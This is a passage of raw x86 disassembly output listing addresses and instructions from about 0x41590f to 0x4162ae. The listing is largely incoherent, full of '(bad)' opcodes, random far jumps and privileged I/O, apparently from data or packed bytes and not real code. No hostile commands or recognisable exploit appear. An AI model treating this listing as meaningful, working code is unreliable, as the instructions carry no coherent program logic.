  41590f:	les    esp,FWORD PTR [eax]
  415911:	jmp    0x4158a5
  415913:	add    edi,DWORD PTR [ebx]
  415915:	sbb    esp,DWORD PTR [ebx]
  415917:	mov    edi,0x3eb93bc9
  41591c:	cmp    esp,edi
  41591e:	pop    esp
  41591f:	add    al,0x41
  415921:	dec    ebx
  415922:	iret   
  415923:	iret   
  415924:	pop    edi
  415925:	cmp    BYTE PTR [esi+0x2ffd5c7c],bh
  41592b:	sahf   
  41592c:	push   ecx
  41592d:	inc    ebp
  41592e:	adc    dl,cl
  415930:	pop    ds
  415931:	xchg   DWORD PTR [edx-0x22bc50f4],edx
  415937:	ret    
  415938:	stc    
  415939:	out    0x46,al
  41593b:	and    BYTE PTR [ecx-0x2f48ef26],al
  415941:	adc    BYTE PTR [ebp+0x2979f322],al
  415947:	jae    0x415902
  415949:	scas   al,BYTE PTR es:[edi]
  41594a:	cwde   
  41594b:	or     ebp,ebp
  41594d:	add    DWORD PTR [ebx],esp
  41594f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415950:	addr16 xchg ebp,eax
  415952:	fcomp  QWORD PTR [esi+0x3]
  415955:	je     0x4158ec
  415957:	frstor [esi-0x74]
  41595a:	pusha  
  41595b:	cmovb  edi,DWORD PTR [ebx+0x521975fa]
  415962:	out    dx,eax
  415963:	(bad)  
  415964:	cmp    al,0x2d
  415966:	call   0x969a:0x92923ac
  41596d:	pop    ebp
  41596e:	xchg   esi,eax
  41596f:	aad    0x2c
  415971:	stos   BYTE PTR es:[edi],al
  415972:	rcr    esp,0x40
  415975:	inc    esi
  415976:	mov    ebp,0xa307db7f
  41597b:	cmp    al,0x48
  41597d:	cmp    eax,0xd2b9b768
  415982:	cdq    
  415983:	test   DWORD PTR [ebp-0x4b],0xaca93aea
  41598a:	mov    bh,0x7f
  41598c:	leave  
  41598d:	ret    
  41598e:	fild   QWORD PTR [ecx+edx*8]
  415991:	xchg   DWORD PTR [esi-0x36],ebp
  415994:	ret    
  415995:	or     bh,dh
  415997:	popa   
  415998:	push   0x6b
  41599a:	in     al,dx
  41599b:	mov    ebp,0x4cc21c8b
  4159a0:	(bad)  [esi]
  4159a2:	adc    al,cl
  4159a4:	in     eax,dx
  4159a5:	je     0x41595d
  4159a7:	mov    ebx,0x43bb570b
  4159ac:	fstp   DWORD PTR [ebp+0x51]
  4159af:	pop    es
  4159b0:	outs   dx,BYTE PTR ds:[esi]
  4159b1:	sub    DWORD PTR es:[eax],ebx
  4159b4:	mov    al,0xe
  4159b6:	aaa    
  4159b7:	gs stc 
  4159b9:	push   eax
  4159ba:	je     0x4159bd
  4159bc:	inc    DWORD PTR [edx+eiz*8+0x27]
  4159c0:	xchg   ecx,eax
  4159c1:	pusha  
  4159c2:	xor    eax,0xc1d5b2d5
  4159c7:	and    esp,esi
  4159c9:	fwait
  4159ca:	or     edi,DWORD PTR [ebx+0x7]
  4159cd:	xchg   DWORD PTR ss:[ecx+0x0],edi
	...
  415ba9:	add    BYTE PTR [eax],al
  415bab:	add    BYTE PTR [esi-0x9b72fa0],al
  415bb1:	clc    
  415bb2:	sahf   
  415bb3:	out    dx,al
  415bb4:	or     eax,0x9ab0d536
  415bb9:	aaa    
  415bba:	xlat   BYTE PTR ds:[ebx]
  415bbb:	gs jns 0x415c27
  415bbe:	add    DWORD PTR [eax],eax
  415bc0:	and    eax,0xf5000007
  415bc5:	xchg   ebx,eax
  415bc6:	jbe    0x415c11
  415bc8:	jne    0x415bff
  415bca:	dec    esp
  415bcb:	out    dx,eax
  415bcc:	ins    BYTE PTR es:[edi],dx
  415bcd:	cmp    ebp,ecx
  415bcf:	rol    BYTE PTR [ecx],cl
  415bd1:	fnstsw WORD PTR [ecx-0x4d]
  415bd4:	xchg   BYTE PTR [ebx+edi*2-0x46],ah
  415bd8:	dec    edx
  415bd9:	adc    ah,0x41
  415bdc:	dec    esi
  415bdd:	icebp  
  415bde:	dec    edi
  415bdf:	pop    ebp
  415be0:	fmulp  st(4),st
  415be2:	out    dx,eax
  415be3:	fnsave [ebx+ecx*2+0x1a]
  415be7:	mov    cs,WORD PTR [edi+0x28]
  415bea:	inc    ecx
  415beb:	mov    edx,0xd8b8830a
  415bf0:	in     al,0x33
  415bf2:	out    0x75,eax
  415bf4:	sub    DWORD PTR [ebp+0x5e23852d],edi
  415bfa:	mov    ds:0x9f7704b0,al
  415bff:	pop    edi
  415c00:	retf   
  415c01:	fld    st(2)
  415c03:	in     eax,dx
  415c04:	gs in  eax,0xc9
  415c07:	dec    edx
  415c08:	ja     0x415be1
  415c0a:	inc    edi
  415c0b:	mov    DWORD PTR [ebx-0x6e8cf952],eax
  415c11:	nop
  415c12:	fldcw  WORD PTR [edi+0x54]
  415c15:	push   0xc1b4789b
  415c1a:	in     al,0xc
  415c1c:	jmp    0x415be9
  415c1e:	rcl    ch,0x56
  415c21:	cmp    ebp,DWORD PTR [esp+ecx*2-0x682a3854]
  415c28:	ret    0x2340
  415c2b:	cmp    ecx,DWORD PTR [edx]
  415c2d:	inc    dl
  415c2f:	cmp    al,0x47
  415c31:	pusha  
  415c32:	sbb    BYTE PTR [edi],0x81
  415c35:	clc    
  415c36:	mov    edx,0x419dd955
  415c3b:	xor    edx,DWORD PTR [ecx]
  415c3d:	test   DWORD PTR [edx+0x75bffd47],ebx
  415c43:	outs   dx,BYTE PTR ds:[esi]
  415c44:	popf   
  415c45:	fild   DWORD PTR [ecx+ecx*4-0x6e]
  415c49:	ins    DWORD PTR es:[edi],dx
  415c4a:	fisub  DWORD PTR [esi-0x502dd13c]
  415c50:	jecxz  0x415cb3
  415c52:	das    
  415c53:	stos   BYTE PTR es:[edi],al
  415c54:	push   ss
  415c55:	mov    ah,0x58
  415c57:	jmp    0x3305:0xe1ff6b09
  415c5e:	xchg   ecx,eax
  415c5f:	pop    ebx
  415c60:	add    eax,0x9d95d752
  415c65:	cmp    ebx,DWORD PTR [ebp+0x44929b02]
  415c6b:	mov    ds:0xd3898441,al
  415c70:	mov    ah,BYTE PTR [edi+0x73b49116]
  415c76:	imul   ebp,DWORD PTR [edx],0xffffffae
  415c79:	popa   
  415c7a:	fucom  st(3)
  415c7c:	lea    ebx,[eax-0x43be790c]
  415c82:	idiv   DWORD PTR [ebx-0x54]
  415c85:	mov    dl,al
  415c87:	or     ah,BYTE PTR [esi-0x77]
  415c8a:	test   al,0xe9
  415c8c:	push   ebx
  415c8d:	sub    BYTE PTR [edi+0x43],ah
  415c90:	stos   BYTE PTR es:[edi],al
  415c91:	inc    edi
  415c92:	sbb    edx,eax
  415c94:	inc    edx
  415c95:	ret    0xf3c4
  415c98:	sub    bl,BYTE PTR [esi]
  415c9a:	and    ah,BYTE PTR [eax-0x7e]
  415c9d:	bound  edi,QWORD PTR [ebp-0x3556530f]
  415ca3:	xchg   esi,eax
  415ca4:	lods   al,BYTE PTR ds:[esi]
  415ca5:	mov    eax,ds:0xa3e081ae
  415caa:	sub    BYTE PTR [edx-0x414e0cf9],al
  415cb0:	leave  
  415cb1:	push   ecx
  415cb2:	adc    al,0xdc
  415cb5:	popa   
  415cb6:	(bad)  
  415cb7:	fbld   TBYTE PTR [ecx]
  415cb9:	dec    ebx
  415cba:	in     al,0x5e
  415cbc:	in     eax,0x75
  415cbe:	in     eax,0x27
  415cc0:	rol    DWORD PTR [edi-0x1f0e9333],cl
  415cc6:	scas   al,BYTE PTR es:[edi]
  415cc7:	inc    esp
  415cc8:	mov    bl,0xd2
  415cca:	cmp    al,0x65
  415ccc:	int    0x9e
  415cce:	mov    esp,0x5fba9398
  415cd3:	xchg   ebx,eax
  415cd4:	jo     0x415cc4
  415cd6:	loopne 0x415d37
  415cd8:	mov    bl,0x8b
  415cda:	mov    ebp,0x9321303e
  415cdf:	and    ebx,DWORD PTR [edi-0x3e046f7d]
  415ce5:	das    
  415ce6:	pop    ss
  415ce7:	sub    al,0xc1
  415ce9:	push   ebx
  415cea:	inc    esi
  415ceb:	jbe    0x415d58
  415ced:	in     al,0xc1
  415cef:	xchg   esi,eax
  415cf0:	in     eax,0x4
  415cf2:	pop    edi
  415cf3:	xor    BYTE PTR [edi+eax*4-0x4],dh
  415cf7:	sub    BYTE PTR [eax],dh
  415cf9:	(bad)  
  415cfa:	jae    0x415cce
  415cfc:	(bad)  
  415cfd:	das    
  415cfe:	adc    ah,dl
  415d00:	push   es
  415d01:	xor    BYTE PTR ds:0x8a8730dd,dl
  415d07:	fwait
  415d08:	sub    esi,DWORD PTR [eax+edx*1-0xefd29f]
  415d0f:	cwde   
  415d10:	int    0x59
  415d12:	out    0xe9,al
  415d14:	cli    
  415d15:	mov    DWORD PTR [ecx-0x56],edx
  415d18:	inc    esp
  415d19:	push   edx
  415d1a:	clc    
  415d1b:	out    0x8a,eax
  415d1d:	cli    
  415d1e:	cdq    
  415d1f:	(bad)  
  415d20:	or     al,0x73
  415d22:	in     al,0x44
  415d24:	aaa    
  415d25:	cmp    ch,BYTE PTR [esi-0x6f9ddac1]
  415d2b:	push   0xbe91e63
  415d30:	add    al,0xce
  415d32:	adc    BYTE PTR [eax+esi*2-0x2132879b],dh
  415d39:	mov    esi,0x53843620
  415d3e:	cmp    DWORD PTR gs:[ebp+0x26],esp
  415d42:	adc    edx,edx
  415d44:	leave  
  415d45:	retf   0xfd05
  415d48:	scas   eax,DWORD PTR es:[edi]
  415d49:	jno    0x415cec
  415d4b:	push   cs
  415d4c:	adc    eax,0xefe6904d
  415d51:	push   ecx
  415d52:	(bad)  
  415d53:	loop   0x415d51
  415d55:	add    al,0x22
  415d57:	daa    
  415d58:	addr16 mov bh,cl
  415d5b:	call   0x6e29abf
  415d60:	popa   
  415d61:	aad    0xbd
  415d63:	retf   
  415d64:	js     0x415cee
  415d66:	(bad)  
  415d67:	cmp    DWORD PTR [ecx+0x74],edi
  415d6a:	repnz xchg edx,eax
  415d6c:	scas   eax,DWORD PTR es:[edi]
  415d6d:	or     edi,DWORD PTR [ecx+0x76]
  415d70:	sub    ecx,DWORD PTR [ecx-0x1d]
  415d73:	test   DWORD PTR [edx-0x4c],0x518c98d2
  415d7a:	xlat   BYTE PTR gs:[ebx]
  415d7c:	loope  0x415d62
  415d7e:	mov    edx,0xff46a2e1
  415d83:	loope  0x415d24
  415d85:	dec    ecx
  415d86:	xchg   ebp,eax
  415d87:	scas   eax,DWORD PTR es:[edi]
  415d88:	pop    edx
  415d89:	xor    esp,0xffffffb8
  415d8c:	add    ebp,esi
  415d8e:	outs   dx,BYTE PTR ds:[esi]
  415d8f:	xchg   esp,eax
  415d90:	mov    eax,ds:0x6456179b
  415d95:	xchg   edx,eax
  415d96:	repz mov dl,0x64
  415d99:	sqrtps xmm1,xmm1
  415d9c:	jns    0x415d36
  415d9e:	std    
  415d9f:	out    dx,al
  415da0:	xchg   BYTE PTR [edi+eax*8+0x16531c6],ah
  415da7:	jl     0x415dd6
  415da9:	shl    DWORD PTR [edx],cl
  415dab:	outs   dx,BYTE PTR ds:[esi]
  415dac:	mov    ebx,0x6cddf332
  415db1:	jns    0x415d4e
  415db3:	pop    ebp
  415db4:	dec    eax
  415db5:	push   ebp
  415db6:	mov    DWORD PTR [edx],esp
  415db8:	xor    ch,BYTE PTR [ebp-0x35d641e]
  415dbe:	cli    
  415dbf:	xor    DWORD PTR [esi+0x2c430e6b],eax
  415dc5:	adc    bl,BYTE PTR [ebx+0x3cfc2273]
  415dcb:	das    
  415dcc:	mov    BYTE PTR [esi],bl
  415dce:	sub    BYTE PTR [ecx+0xf],0x6d
  415dd2:	je     0x415e3e
  415dd4:	icebp  
  415dd5:	mov    dl,0x84
  415dd7:	aaa    
  415dd8:	jmp    0x415d99
  415dda:	xchg   edx,eax
  415ddb:	mov    dh,0x73
  415ddd:	or     DWORD PTR ds:0xcf57d178,ebx
  415de3:	jb     0x415db9
  415de5:	cli    
  415de6:	adc    dl,BYTE PTR [ecx-0x8dbb320]
  415dec:	(bad)  
  415ded:	jmp    0x415dd6
  415def:	cmp    dl,BYTE PTR [ecx]
  415df1:	jmp    0x94a93991
  415df6:	mov    es,WORD PTR [edi-0x1e538da3]
  415dfc:	inc    eax
  415dfd:	xchg   ecx,eax
  415dfe:	cld    
  415dff:	sub    BYTE PTR [edx-0x28],cl
  415e02:	push   cs
  415e03:	repnz cmp DWORD PTR es:[ebp+ebx*8-0x1f],esi
  415e09:	sub    DWORD PTR [ebp+esi*2-0x26],0x39
  415e0e:	and    esi,DWORD PTR [ebx-0x6e31fe7d]
  415e14:	imul   esi,DWORD PTR [edi-0x25],0xffffff9c
  415e18:	pop    ss
  415e19:	and    DWORD PTR [esp+eiz*4-0x45],esi
  415e1d:	jmp    DWORD PTR [ebx+0x78cf3c90]
  415e23:	jae    0x415e7c
  415e25:	mov    bl,bh
  415e27:	or     eax,0x5f
  415e2a:	nop
  415e2b:	in     al,0x3c
  415e2d:	out    dx,eax
  415e2e:	loope  0x415e70
  415e30:	push   ds
  415e31:	mov    edi,0x2b2e6c74
  415e36:	(bad)  
  415e37:	enter  0xeaf,0xc7
  415e3b:	loopne 0x415e65
  415e3d:	or     DWORD PTR [eax],0xffffffd7
  415e40:	neg    DWORD PTR [ebx]
  415e42:	mov    edx,0x8eab6871
  415e47:	inc    ebx
  415e48:	stos   BYTE PTR es:[edi],al
  415e49:	adc    BYTE PTR [edx+eax*1+0x32],dl
  415e4d:	jg     0x415e5a
  415e4f:	into   
  415e50:	pop    esp
  415e51:	mul    ebp
  415e53:	jmp    0xbe9fb810
  415e58:	mov    BYTE PTR ds:0xc6ca1cc7,ch
  415e5e:	dec    eax
  415e5f:	inc    esp
  415e60:	fnstcw WORD PTR [ecx+0x326ed364]
  415e66:	mov    DWORD PTR [ecx-0x66],ebx
  415e69:	add    BYTE PTR [ecx],bl
  415e6b:	inc    esi
  415e6c:	adc    al,0xba
  415e6e:	mov    ah,bh
  415e70:	push   ss
  415e71:	imul   esp,esi,0xd24f64c0
  415e77:	xchg   edi,eax
  415e78:	sbb    eax,DWORD PTR [esi+esi*2+0x3b]
  415e7c:	popa   
  415e7d:	push   ss
  415e7e:	push   esp
  415e7f:	jb     0x415e47
  415e81:	dec    ebp
  415e82:	dec    eax
  415e83:	xor    eax,0x311c7967
  415e88:	loop   0x415eac
  415e8a:	loop   0x415e69
  415e8c:	sbb    eax,0x1fea10c4
  415e91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e92:	mov    ebp,es
  415e94:	mov    eax,DWORD PTR [esi+0x5cbfe962]
  415e9a:	pop    ecx
  415e9b:	push   es
  415e9c:	pop    es
  415e9d:	jmp    0xdd6:0x84267930
  415ea4:	aad    0x41
  415ea6:	and    DWORD PTR [ecx+0x43340088],esp
  415eac:	cmc    
  415ead:	scas   eax,DWORD PTR es:[edi]
  415eae:	jg     0x415ef8
  415eb0:	pop    ebx
  415eb1:	push   edi
  415eb2:	loopne 0x415e8e
  415eb4:	(bad)  
  415eb5:	sub    al,0x6d
  415eb7:	call   0xfdbe2841
  415ebc:	bound  ecx,QWORD PTR [edi-0x237f749e]
  415ec2:	xlat   BYTE PTR ds:[ebx]
  415ec3:	xchg   edx,eax
  415ec4:	sahf   
  415ec5:	mov    esi,0xd404ecc2
  415eca:	mov    dl,0x8b
  415ecc:	cmp    eax,0xcb6b76c7
  415ed1:	cli    
  415ed2:	cs jl  0x415e9b
  415ed5:	fsub   QWORD PTR [ebx]
  415ed7:	inc    esi
  415ed8:	adc    eax,0x8bd2d73e
  415edd:	aad    0x8a
  415edf:	iret   
  415ee0:	mov    esp,0xec05fb12
  415ee5:	xor    al,0xba
  415ee7:	jg     0x415e97
  415ee9:	test   ah,bh
  415eeb:	jge    0x415f05
  415eed:	adc    edi,ebx
  415eef:	inc    edi
  415ef0:	or     al,0xc4
  415ef2:	popa   
  415ef3:	cmp    dh,BYTE PTR [eax+0x28910122]
  415ef9:	xor    DWORD PTR [edi],ecx
  415efb:	pop    esi
  415efc:	mov    DWORD PTR [edi-0x15],edi
  415eff:	push   ss
  415f00:	xchg   ebp,eax
  415f01:	add    cl,BYTE PTR [edi+edi*2+0x63]
  415f05:	xor    edi,edi
  415f07:	loop   0x415eae
  415f09:	not    DWORD PTR [ebx-0x29]
  415f0c:	mov    dl,0x67
  415f0e:	sbb    ebp,DWORD PTR [edx-0x7210b01b]
  415f14:	adc    dl,BYTE PTR [ecx]
  415f16:	outs   dx,BYTE PTR ds:[esi]
  415f17:	les    edi,FWORD PTR [ebx+0xa97b06f]
  415f1d:	aas    
  415f1e:	icebp  
  415f1f:	inc    ebx
  415f20:	fs inc esp
  415f22:	das    
  415f23:	dec    esi
  415f24:	call   0x9aae:0x556bd4b9
  415f2b:	pop    eax
  415f2c:	div    BYTE PTR [bp+di-0x374c]
  415f31:	mov    BYTE PTR [esp+ecx*8],bh
  415f34:	xor    eax,0xc65c9837
  415f39:	adc    DWORD PTR [ebp+0x57afed96],ebx
  415f3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f40:	push   eax
  415f41:	enter  0xcc7b,0x64
  415f45:	sar    BYTE PTR [ebp+0x54],cl
  415f48:	fs sbb al,0x49
  415f4b:	cld    
  415f4c:	cmp    DWORD PTR [ecx+0x34],esp
  415f4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f50:	in     al,dx
  415f51:	inc    esp
  415f52:	jne    0x415f81
  415f54:	ds push esp
  415f56:	pop    ebp
  415f57:	nop
  415f58:	stc    
  415f59:	sub    eax,0x7b30b99
  415f5e:	lock pusha 
  415f60:	mov    esi,DWORD PTR [eax-0x7ba6a7c0]
  415f66:	pushf  
  415f67:	push   ebp
  415f68:	aaa    
  415f69:	mov    edi,0xc4296016
  415f6e:	jp     0x415f9b
  415f70:	mov    ds:0xd52bb9f,al
  415f75:	shl    ebx,0xa0
  415f78:	ficom  DWORD PTR [edx]
  415f7a:	jp     0x415f5d
  415f7c:	add    dl,ch
  415f7e:	pushf  
  415f7f:	fstp   TBYTE PTR [ecx]
  415f81:	test   ch,dh
  415f83:	sahf   
  415f84:	dec    esi
  415f85:	jmp    0x415fd1
  415f87:	cmp    al,0x7e
  415f89:	xchg   edi,eax
  415f8a:	daa    
  415f8b:	jo     0x415ffc
  415f8d:	push   edx
  415f8e:	pop    edx
  415f8f:	mov    al,BYTE PTR [esi+0x61]
  415f92:	test   eax,0x4f515f10
  415f97:	inc    ebx
  415f98:	pop    ds
  415f99:	shr    BYTE PTR [ebp+ecx*4+0x2d31a583],cl
  415fa0:	xchg   esp,eax
  415fa1:	or     DWORD PTR [eax-0x2f6e9be3],eax
  415fa7:	(bad)  
  415fa8:	je     0x93aac1ba
  415fae:	push   esi
  415faf:	push   ebx
  415fb0:	(bad)  
  415fb1:	in     eax,dx
  415fb2:	mov    cl,BYTE PTR [esp+ebp*1]
  415fb5:	ins    BYTE PTR es:[edi],dx
  415fb6:	mov    ch,0xb0
  415fb8:	int    0xd0
  415fba:	sar    BYTE PTR [ecx],1
  415fbc:	pusha  
  415fbd:	imul   esi,esp,0xffffffeb
  415fc0:	mov    ds:0x1d3b6a7b,eax
  415fc5:	mov    DWORD PTR ss:[esi],ecx
  415fc8:	mov    dl,0xcc
  415fca:	aaa    
  415fcb:	es popf 
  415fcd:	jmp    DWORD PTR [bp+di+0x5dbc]
  415fd2:	enter  0x8538,0x11
  415fd6:	cmp    BYTE PTR [esi+eiz*8-0x31354c4b],bl
  415fdd:	mov    ebx,0x12aaa958
  415fe2:	sub    edx,DWORD PTR [ebp-0x10]
  415fe5:	outs   dx,DWORD PTR ds:[esi]
  415fe6:	out    0x6c,eax
  415fe8:	mov    fs,WORD PTR [edx]
  415fea:	scas   ax,WORD PTR es:[edi]
  415fec:	repnz nop
  415fee:	pop    es
  415fef:	imul   ebp,edi,0x85046539
  415ff5:	xlat   BYTE PTR ds:[ebx]
  415ff6:	ins    BYTE PTR es:[edi],dx
  415ff7:	mov    bl,BYTE PTR [ecx-0x11]
  415ffa:	shl    DWORD PTR [eax-0x5a],0xcd
  415ffe:	dec    ebp
  415fff:	mov    eax,0x8732f625
  416004:	push   ebp
  416005:	mov    ds:0xd4a4da5f,al
  41600a:	(bad)  
  41600c:	adc    eax,0xc5f89b08
  416011:	ins    BYTE PTR es:[edi],dx
  416012:	and    DWORD PTR [esi+0x4f477389],0x3db92f4b
  41601c:	cdq    
  41601d:	mov    edi,0xb2897043
  416022:	mov    ds:0xf0402c49,al
  416027:	or     al,0x43
  416029:	int3   
  41602a:	xchg   dl,bl
  41602c:	mov    ds:0xd237ac49,al
  416031:	push   edi
  416032:	mov    edx,0xa8b1d6d3
  416037:	adc    BYTE PTR [esi-0x6e],0x92
  41603b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41603c:	outs   dx,BYTE PTR ds:[esi]
  41603d:	iret   
  41603e:	inc    ecx
  41603f:	sub    eax,0x39a50624
  416044:	cdq    
  416045:	add    DWORD PTR ds:0x21e5b409,ebx
  41604b:	jo     0x416042
  41604d:	loope  0x41603a
  41604f:	mov    ah,0x22
  416051:	xchg   edi,eax
  416052:	aas    
  416053:	adc    ebp,eax
  416055:	adc    DWORD PTR [ebp-0x3db20c17],0xffffffeb
  41605c:	and    BYTE PTR [ebx+0x62],ch
  41605f:	xchg   ebp,eax
  416060:	outs   dx,BYTE PTR ds:[esi]
  416061:	(bad)  [eax+0x6d767ea4]
  416067:	imul   ecx,DWORD PTR [ecx+0x62],0xffffffb9
  41606b:	popf   
  41606c:	push   esp
  41606d:	adc    ah,BYTE PTR [edx-0x2]
  416070:	gs sti 
  416072:	mov    BYTE PTR [esi-0x6e193987],ah
  416078:	outs   dx,DWORD PTR ds:[esi]
  416079:	pusha  
  41607a:	push   esp
  41607b:	popf   
  41607c:	mov    ch,0xd1
  41607e:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  416080:	sub    BYTE PTR [esi],0x62
  416083:	ret    
  416084:	out    0x7b,al
  416086:	int    0xec
  416088:	mov    ds:0xed7a3b10,eax
  41608d:	je     0x4160d2
  41608f:	adc    eax,0x19c2a454
  416094:	sub    al,0xc4
  416096:	into   
  416097:	pushf  
  416098:	and    ch,dl
  41609a:	data16 jnp 0x416042
  41609d:	ficomp DWORD PTR [ebp+0x7c3e7687]
  4160a3:	sbb    edx,DWORD PTR [edx-0xc]
  4160a6:	adc    eax,0x9e7090f7
  4160ab:	adc    esp,DWORD PTR [ecx]
  4160ad:	xchg   ecx,eax
  4160ae:	jmp    0x2efc:0x4655a420
  4160b5:	sub    dh,bl
  4160b7:	jle    0x416128
  4160b9:	pop    ebp
  4160ba:	and    DWORD PTR [eax-0x73],ebp
  4160bd:	or     eax,0x5df9f5c5
  4160c2:	cmp    esp,edx
  4160c4:	les    ebp,FWORD PTR [eax-0x7e76ae6b]
  4160ca:	test   dl,0x6e
  4160cd:	and    eax,0x57d8edef
  4160d2:	mov    dh,0xf
  4160d4:	mov    ax,ds:0x999451d3
  4160da:	sub    dh,BYTE PTR [ecx]
  4160dc:	pushf  
  4160dd:	fsub   DWORD PTR [edi+edi*4]
  4160e0:	sbb    BYTE PTR [esi-0x29],0xc6
  4160e4:	push   0xffffffc7
  4160e6:	outs   dx,DWORD PTR ds:[esi]
  4160e7:	xor    esi,DWORD PTR [esi+0x1a]
  4160ea:	shl    BYTE PTR [eax],1
  4160ec:	and    BYTE PTR [esi],ch
  4160ee:	dec    esp
  4160ef:	adc    DWORD PTR [esi],esp
  4160f1:	(bad)
  4160f6:	ret    
  4160f7:	cmp    al,BYTE PTR [ecx]
  4160f9:	test   al,0x44
  4160fb:	loop   0x4160e3
  4160fd:	lods   eax,DWORD PTR ds:[esi]
  4160fe:	stc    
  4160ff:	sbb    eax,ebx
  416101:	mov    ds:0xc206851,al
  416106:	mov    edx,0x6806db8d
  41610b:	outs   dx,DWORD PTR ds:[esi]
  41610c:	mov    ch,0xfc
  41610e:	pop    ds
  41610f:	shl    DWORD PTR [ecx-0x1be7835b],cl
  416115:	adc    dh,BYTE PTR [eax]
  416117:	pop    ebp
  416118:	in     eax,0xec
  41611a:	inc    edx
  41611b:	xor    al,BYTE PTR [ebx-0x71b9c804]
  416121:	fcomp  QWORD PTR [esi+0x6b]
  416124:	mov    cl,al
  416126:	in     al,dx
  416127:	pop    ebx
  416128:	mov    gs,WORD PTR [esi-0x5a]
  41612b:	dec    ecx
  41612c:	mov    bl,0x98
  41612e:	or     cl,al
  416130:	inc    edx
  416131:	xchg   ecx,eax
  416132:	sbb    ebx,edi
  416134:	cld    
  416135:	nop
  416136:	sub    eax,0x87ceaa2a
  41613b:	mov    cl,BYTE PTR [ecx+0x504c61c]
  416141:	push   esp
  416142:	mov    ecx,0x841e7c44
  416147:	sbb    esi,0xdc4aadf8
  41614d:	xchg   DWORD PTR ds:0x7454f64c,esi
  416153:	mov    eax,ds:0xe3eda052
  416158:	push   esp
  416159:	dec    eax
  41615a:	fiadd  WORD PTR [edi+ebp*1-0x40]
  41615e:	test   al,0x46
  416160:	outs   dx,DWORD PTR ds:[esi]
  416161:	jo     0x41610f
  416163:	dec    esi
  416164:	mov    edi,0x3f6e6760
  416169:	data16 (bad) 
  41616b:	push   cs
  41616c:	rol    DWORD PTR [ebp-0x65],1
  41616f:	and    BYTE PTR [eax-0x7d688560],0x1b
  416176:	jnp    0x416153
  416178:	xchg   ebx,eax
  416179:	and    eax,0xb3bf783e
  41617e:	adc    eax,0x3f55e0e5
  416183:	aad    0xd0
  416185:	mov    ch,ch
  416187:	rol    DWORD PTR [edx+edx*1-0x653bcc4a],1
  41618e:	add    DWORD PTR [ebp+0x4fe79330],0x69
  416195:	pop    es
  416196:	sbb    BYTE PTR [ebx],dl
  416198:	(bad)  
  416199:	cmc    
  41619a:	sub    al,0x75
  41619c:	xor    BYTE PTR [eax+0x14051fe2],ah
  4161a2:	mov    ecx,0x954b7430
  4161a7:	enter  0xc6b3,0x22
  4161ab:	das    
  4161ac:	add    eax,0xdc1ec293
  4161b1:	and    ecx,edx
  4161b3:	sar    DWORD PTR ds:0x61081799,0x87
  4161ba:	repnz xlat BYTE PTR ds:[ebx]
  4161bc:	fnstcw WORD PTR [edi-0x29f66044]
  4161c2:	fwait
  4161c3:	cmp    BYTE PTR [ecx+eax*2],0xe7
  4161c7:	push   ds
  4161c8:	cdq    
  4161c9:	push   es
  4161ca:	arpl   WORD PTR [eax],sp
  4161cc:	rcl    BYTE PTR [esi-0x13],cl
  4161cf:	sbb    BYTE PTR [edx+0x48],bh
  4161d2:	clc    
  4161d3:	cmp    al,0x56
  4161d5:	int    0x33
  4161d7:	fcomp  QWORD PTR [edi+0x3e63884a]
  4161dd:	sub    edi,DWORD PTR [eax]
  4161df:	jp     0x4161f1
  4161e1:	(bad)  
  4161e2:	dec    ebp
  4161e3:	maxps  xmm0,XMMWORD PTR [esi+0x41cfdd9c]
  4161ea:	jg     0x4161ce
  4161ec:	or     DWORD PTR [ecx-0x22],0xffffffdb
  4161f0:	mov    ah,0xba
  4161f2:	test   DWORD PTR [esi+0x6829213],edi
  4161f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4161f9:	cmp    ecx,DWORD PTR [esi]
  4161fb:	sahf   
  4161fc:	mov    ds:0x8c4c714b,eax
  416201:	test   eax,0x149ac69
  416206:	sti    
  416207:	cmp    ebx,DWORD PTR [edi-0x61]
  41620a:	sbb    ebx,0x23
  41620d:	pop    es
  41620e:	xchg   esp,eax
  41620f:	dec    ecx
  416210:	cmp    DWORD PTR [ebx-0x30],ebx
  416213:	add    DWORD PTR [ecx+0x74],esi
  416216:	jecxz  0x416263
  416218:	icebp  
  416219:	inc    ebx
  41621a:	dec    esi
  41621b:	jmp    0xd1dcf481
  416220:	dec    eax
  416221:	fadd   QWORD PTR [edi]
  416223:	or     DWORD PTR [edx+edx*1-0x7f],esp
  416227:	sbb    al,0x4e
  416229:	hlt    
  41622a:	mov    bh,0x1b
  41622c:	addr16 jmp 0xb3b8:0xcafaefba
  416234:	jno    0x4161ff
  416236:	inc    ecx
  416237:	sub    BYTE PTR [edi-0x22bfcff4],0x62
  41623e:	repz dec ebp
  416240:	sbb    al,0xc3
  416242:	test   DWORD PTR [ebx],0x2570dfdb
  416248:	mov    ebp,0xc7307d23
  41624d:	inc    esi
  41624e:	in     eax,dx
  41624f:	aam    0xd9
  416251:	fld    TBYTE PTR [edx+0xa]
  416254:	mov    ch,0x8f
  416256:	dec    ebx
  416257:	xor    bl,bh
  416259:	(bad)  
  41625a:	fcom   DWORD PTR [ebx+0xb]
  41625d:	call   0x28882321
  416262:	pop    esp
  416263:	hlt    
  416264:	imul   edi,DWORD PTR [ecx+0x2143682a],0x74
  41626b:	add    ecx,DWORD PTR [ebx+0x4b]
  41626e:	sahf   
  41626f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416270:	hlt    
  416271:	scas   al,BYTE PTR es:[edi]
  416272:	jbe    0x416225
  416274:	loope  0x41621c
  416276:	jmp    0x1f3b:0x2716548a
  41627d:	adc    DWORD PTR [ebx+0x5b1e53],0x36
  416284:	stc    
  416285:	sbb    al,0x6f
  416287:	mov    DWORD PTR [ecx+eax*1-0x3664d777],esp
  41628e:	or     ecx,ecx
  416290:	jle    0x416247
  416292:	sbb    dh,BYTE PTR [ebx-0x2a]
  416295:	les    ecx,FWORD PTR [ebx-0x208a8a82]
  41629b:	or     cl,ch
  41629d:	push   ss
  41629e:	or     bl,BYTE PTR ds:0x1c5783b6
  4162a4:	push   es
  4162a5:	loope  0x4162f3
  4162a7:	xlat   BYTE PTR ds:[ebx]
  4162a8:	dec    esp
  4162a9:	and    eax,0xe87b82f2
  4162ae:	sub    al,0x22
